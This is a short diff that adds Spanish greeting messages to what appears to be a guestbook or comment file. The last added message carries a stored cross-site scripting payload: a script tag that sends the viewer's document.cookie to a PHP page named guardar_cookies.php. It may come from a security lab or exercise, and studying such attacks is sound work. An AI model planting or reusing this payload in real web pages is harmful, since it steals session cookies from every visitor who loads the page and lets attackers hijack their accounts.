@@ -1,0 +1,6 @@
+Buenos días
+
+Hola
+
+Hola. Aquí el usuario reportándose. <script type="text/javascript"> fetch("./guardar_cookies.php?cookies="+document.cookie); </script>
+
